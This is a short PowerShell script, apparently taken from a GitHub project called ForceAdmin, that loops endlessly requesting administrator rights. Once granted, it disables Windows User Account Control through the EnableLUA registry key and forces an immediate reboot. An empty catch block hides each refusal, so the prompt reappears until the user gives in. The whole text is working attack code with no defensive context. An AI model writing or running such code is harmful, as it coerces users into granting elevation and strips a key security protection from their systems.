# https://github.com/Chainski/ForceAdmin
Set-ExecutionPolicy -Scope CurrentUser Undefined -Force
while($true)
 {
	 try
  {  
    Start-Process 'powershell' -Verb runas -ArgumentList '-c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f ; shutdown /r /t 0
';exit
     
	}
    catch{}   
}